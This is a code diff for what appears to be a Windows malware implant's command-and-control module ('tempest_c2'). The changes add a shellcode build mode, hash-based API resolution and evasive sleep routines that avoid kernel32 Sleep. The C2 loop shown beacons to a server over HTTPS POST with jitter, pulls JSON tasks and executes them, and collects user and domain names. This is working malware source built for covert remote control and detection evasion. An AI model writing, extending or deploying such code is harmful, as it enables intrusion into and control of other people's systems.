@@ -9,15 +9,23 @@
  */
 #include <windows.h>
 #include <winternl.h>
+#include <stdint.h>
+#include <stdarg.h>
+#ifdef TEMPEST_PIC_SHELLCODE
+#include "tempest_pic_compat.h"
+#else
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <stdint.h>
-#include <stdarg.h>
 #include <ctype.h>
+#endif
 
 #include "loader.h"
+#if defined(TEMPEST_PIC_SHELLCODE)
+#include "bm_pic_deferral_mosaic.h"
+#else
 #include "morpheus.h"
+#endif
 #include "tempest_bootstrap.h"
 #include "tempest_c2.h"
 
@@ -115,6 +123,8 @@ typedef unsigned short INTERNET_PORT;
 #  define H_GetCurrentProcessId 0x5fb665dcu
 #  define H_ExitProcess        0x85b5a546u
 #  define H_GetUserNameA       0x562144eeu
+/* FNV-1a("OutputDebugStringA") — pic C2 trace only (tempest_c2.c) */
+#  define H_OutputDebugStringA 0x0b598a79u
 #  define H_WinHttpOpen              0xefe4d879u
 #  define H_WinHttpSetOption         0x0240120eu
 #  define H_WinHttpConnect           0x886d46c9u
@@ -159,6 +169,9 @@ typedef DWORD (WINAPI *pGetLastError_t)(void);
 typedef DWORD (WINAPI *pGetCurrentProcessId_t)(void);
 typedef void (WINAPI *pExitProcess_t)(UINT);
 typedef BOOL (WINAPI *pGetUserNameA_t)(LPSTR, LPDWORD);
+#if TEMPEST_C2_TRACE && defined(TEMPEST_PIC_SHELLCODE)
+typedef void (WINAPI *pOutputDebugStringA_t)(LPCSTR);
+#endif
 typedef NTSTATUS (WINAPI *pBCryptOpenAlgorithmProvider_t)(BCRYPT_ALG_HANDLE *, LPCWSTR, LPCWSTR, ULONG);
 typedef NTSTATUS (WINAPI *pBCryptSetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
 typedef NTSTATUS (WINAPI *pBCryptGetProperty_t)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG *, ULONG);
@@ -181,6 +194,9 @@ static pGetLastError_t pGetLastError;
 static pGetCurrentProcessId_t pGetCurrentProcessId;
 static pExitProcess_t pExitProcess;
 static pGetUserNameA_t pGetUserNameA;
+#if TEMPEST_C2_TRACE && defined(TEMPEST_PIC_SHELLCODE)
+static pOutputDebugStringA_t pOutputDebugStringA;
+#endif
 static pWinHttpOpen_t pWinHttpOpen;
 static pWinHttpSetOption_t pWinHttpSetOption;
 static pWinHttpConnect_t pWinHttpConnect;
@@ -201,7 +217,25 @@ static pBCryptDestroyKey_t pBCryptDestroyKey;
 static pBCryptCloseAlgorithmProvider_t pBCryptCloseAlgorithmProvider;
 
 #if TEMPEST_C2_TRACE
-static void c2_t(const char *fmt, ...) {
+#ifdef TEMPEST_PIC_SHELLCODE
+static void c2_t(const char *fmt, ...)
+{
+    char buf[896];
+    va_list ap;
+    int pl = pic_snprintf(buf, sizeof buf, "[tempest c2] ");
+    size_t off = (pl > 0) ? (size_t)pl : (size_t)0;
+    if (off >= sizeof buf - 1u)
+        return;
+    va_start(ap, fmt);
+    pic_vsnprintf(buf + off, sizeof buf - off, fmt, ap);
+    va_end(ap);
+    buf[sizeof buf - 1u] = '\0';
+    if (pOutputDebugStringA)
+        pOutputDebugStringA(buf);
+}
+#else
+static void c2_t(const char *fmt, ...)
+{
     va_list ap;
     fputs("[tempest c2] ", stderr);
     va_start(ap, fmt);
@@ -210,7 +244,9 @@ static void c2_t(const char *fmt, ...) {
     fputc('\n', stderr);
     (void)fflush(stderr);
 }
-static void c2_t_winerr(const char *op, const char *step) {
+#endif
+static void c2_t_winerr(const char *op, const char *step)
+{
     DWORD e = pGetLastError ? pGetLastError() : 0u;
     c2_t("%s: %s failed, err=0x%lx", op, step, (unsigned long)e);
 }
@@ -257,6 +293,11 @@ static int c2_resolve_init(void) {
     RES(k32, H_GetLastError, pGetLastError_t, pGetLastError);
     RES(k32, H_GetCurrentProcessId, pGetCurrentProcessId_t, pGetCurrentProcessId);
     RES(k32, H_ExitProcess, pExitProcess_t, pExitProcess);
+#if TEMPEST_C2_TRACE && defined(TEMPEST_PIC_SHELLCODE)
+    /* Optional: trace still works if this export changes; do not fail C2 init. */
+    pOutputDebugStringA =
+        (pOutputDebugStringA_t)(void *)resolve_addr(k32, H_OutputDebugStringA);
+#endif
     RES(ad, H_GetUserNameA, pGetUserNameA_t, pGetUserNameA);
     return 0;
 }
@@ -467,15 +508,19 @@ static void on_task(const char *s, void *ud) { c2_coll_t *c = (c2_coll_t *)ud; c
     run_line(s, t, (sizeof g_c2_onetask));
     for (pp = t; *pp; pp++) { if (c->pout - c->out < (int)sizeof c->out - 4) *c->pout++ = *pp; } *c->pout = 0; }
 
-/* BM-T6001: beacon interval uses Morpheus (direct syscalls), not kernel32 Sleep. */
-static void c2_backoff_sleep(morpheus_ctx_t *morph, DWORD ms)
+/* Interval sleep: PE = Morpheus (BM-T6001); PIC = Mosaic (BM-T6003). Never kernel32 Sleep. */
+static void c2_backoff_sleep(void *sleep_ctx, DWORD ms)
 {
-    if (!morph) return;
-    if (morpheus_sleep(morph, ms) != MORPHEUS_OK)
+    if (!sleep_ctx) return;
+#if defined(TEMPEST_PIC_SHELLCODE)
+    deferral_mosaic_sleep((deferral_mosaic_ctx *)sleep_ctx, ms);
+#else
+    if (morpheus_sleep((morpheus_ctx_t *)sleep_ctx, ms) != MORPHEUS_OK)
         c2_t("Morpheus sleep returned error (continuing loop)");
+#endif
 }
 
-void tempest_c2_run(morpheus_ctx_t *morph) {
+void tempest_c2_run(void *sleep_ctx) {
     unsigned char *k32 = NULL, *ct = NULL; size_t klen, cl, b64l;
     char *b64b = NULL, *resp = NULL, *jb = NULL; char hbuf[2048], jbuf[16384], euser[200], edom[200], eex[600], tok[512], sl[128];
     wchar_t wh[256]; unsigned long h; int port; port = atoi(TS_PORT);
@@ -531,11 +576,11 @@ void tempest_c2_run(morpheus_ctx_t *morph) {
     if (https_post("POST /index", wh, (INTERNET_PORT)port, L"/index", hbuf, b64b, (DWORD)strlen(b64b), &resp, &h) != 0) { free(b64b); b64b = NULL;
         c2_t("POST /index failed, sleeping and retrying");
         { ULONGLONG te = pGetTickCount64(); unsigned S = (unsigned)atoi(TS_SLEEP), J = (unsigned)atoi(TS_JITTER);
-        c2_backoff_sleep(morph, (DWORD)(S * 1000u + (J && S ? (unsigned)(te % (ULONGLONG)(S * J + 1u)) : 0))); }
+        c2_backoff_sleep(sleep_ctx, (DWORD)(S * 1000u + (J && S ? (unsigned)(te % (ULONGLONG)(S * J + 1u)) : 0))); }
         continue; } free(b64b); b64b = NULL;
     if (h != 200 || !resp) { c2_t("POST /index HTTP %lu, retrying after sleep (no 200 or empty body)", h); free(resp);
         { ULONGLONG te = pGetTickCount64(); unsigned S = (unsigned)atoi(TS_SLEEP), J = (unsigned)atoi(TS_JITTER);
-        c2_backoff_sleep(morph, (DWORD)(S * 1000u + (J && S ? (unsigned)(te % (ULONGLONG)(S * J + 1u)) : 0))); }
+        c2_backoff_sleep(sleep_ctx, (DWORD)(S * 1000u + (J && S ? (unsigned)(te % (ULONGLONG)(S * J + 1u)) : 0))); }
         continue; }
     c2_t("POST /index text preview: %.300s", resp);
     g_c2coll.tcsv[0] = 0; g_c2coll.pout = g_c2coll.out; g_c2coll.out[0] = 0; g_c2coll.first = 1; walk_json_strings(resp, on_task, &g_c2coll);
@@ -563,6 +608,6 @@ void tempest_c2_run(morpheus_ctx_t *morph) {
         free(jb); jb = NULL; }
     }
     { ULONGLONG t0 = pGetTickCount64(); unsigned S = (unsigned)atoi(TS_SLEEP), J = (unsigned)atoi(TS_JITTER);
-    c2_backoff_sleep(morph, (DWORD)(S * 1000u + (J && S ? (unsigned)(t0 % (ULONGLONG)(S * J + 1u)) : 0))); }
+    c2_backoff_sleep(sleep_ctx, (DWORD)(S * 1000u + (J && S ? (unsigned)(t0 % (ULONGLONG)(S * J + 1u)) : 0))); }
     }
 }
